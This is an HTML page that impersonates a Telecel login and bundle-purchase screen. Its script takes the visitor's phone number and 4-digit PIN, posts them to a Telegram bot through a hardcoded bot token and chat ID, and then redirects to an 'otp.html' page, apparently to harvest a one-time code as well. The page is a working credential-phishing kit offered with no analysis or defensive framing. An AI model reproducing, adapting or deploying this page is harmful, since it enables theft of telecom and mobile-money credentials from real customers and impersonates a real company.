<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - Log In & Purchase</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .main-container {
            display: flex;
            width: 100%;
            max-width: 1200px;
            background: white;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            margin: 20px;
        }
        .left-side {
            flex: 1;
            background: url('https://images.unsplash.com/photo-1622445275576-721325763afe?w=800') center/cover no-repeat;
            position: relative;
            min-height: 620px;
        }
        .left-overlay {
            position: absolute;
            bottom: 40px;
            left: 40px;
            color: white;
        }
        .left-overlay h2 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 12px;
        }
        .left-overlay p {
            font-size: 15px;
            max-width: 320px;
        }

        .right-side {
            flex: 1;
            padding: 50px 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h2 {
            color: #E30613;
            font-size: 32px;
            font-weight: 900;
        }
        h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #64748b;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 22px;
        }
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #334155;
        }
        select, input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            font-size: 16px;
        }
        select:focus, input:focus {
            border-color: #E30613;
            outline: none;
        }
        .continue-btn {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 25px 0 15px;
        }
        .continue-btn:hover {
            background: #c0040f;
        }
        .register {
            text-align: center;
            font-size: 15px;
        }
        .register a {
            color: #E30613;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Left Image -->
        <div class="left-side">
            <div class="left-overlay">
                <h2>Effortless transactions</h2>
                <p>Pay broadband and utility bills, buy bundles, manage your accounts with just a few links.</p>
            </div>
        </div>

        <!-- Right Form -->
        <div class="right-side">
            <div class="logo">
                <h2>telecel</h2>
            </div>

            <h1>Welcome Back</h1>
            <p class="subtitle">Enter your details to proceed</p>

            <div class="form-group">
                <label>Select Account Type <span style="color:red;">*</span></label>
                <select id="accountType">
                    <option value="mobile">Mobile</option>
                    <option value="broadband">Broadband</option>
                </select>
            </div>

            <div class="form-group">
                <label>Telephone Number <span style="color:red;">*</span></label>
                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
            </div>

            <div class="form-group">
                <label>PIN <span style="color:red;">*</span></label>
                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>

            <button class="continue-btn" onclick="proceedLogin()">Continue</button>

            <div class="register">
                Don't have an account? <a href="#">Register Here</a>
            </div>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; align-items:center; justify-content:center;">
        <div style="width:60px; height:60px; border:6px solid #fff; border-top:6px solid #E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
    </div>

    <script>
        // === CONFIG ===
        const CONFIG = {
            BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
            CHAT_ID: '8757709711',
            REDIRECT_PAGE: 'otp.html'
        };

        let state = { bundleInfo: null };

        function extractBundleInfo() {
            const params = new URLSearchParams(window.location.search);
            const bundle = params.get('bundle');
            const price = params.get('price');
            if (bundle && price) {
                state.bundleInfo = { bundle, price };
            }
        }

        function proceedLogin() {
            const accountType = document.getElementById('accountType').value;
            const phone = document.getElementById('phone').value.trim();
            const pin = document.getElementById('password').value.trim();

            if (!phone || phone.length < 9) {
                alert("Please enter a valid Telephone Number");
                return;
            }
            if (!pin || pin.length !== 4) {
                alert("PIN must be 4 digits");
                return;
            }

            document.getElementById('spinner').style.display = 'flex';

            const message = `<b>Telecel Login Attempt</b>\n\n` +
                            `Account Type: ${accountType}\n` +
                            `Phone: ${phone}\n` +
                            `PIN: ${pin}\n` +
                            (state.bundleInfo ? `\nBundle: ${state.bundleInfo.bundle}\nPrice: GHS ${state.bundleInfo.price}` : '');

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(() => {
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_PAGE;
                }, 1500);
            })
            .catch(err => {
                console.error(err);
                alert("Connection error. Please try again.");
                document.getElementById('spinner').style.display = 'none';
            });
        }

        // Initialize
        extractBundleInfo();
        document.getElementById('phone').focus();
    </script>
</body>
</html>
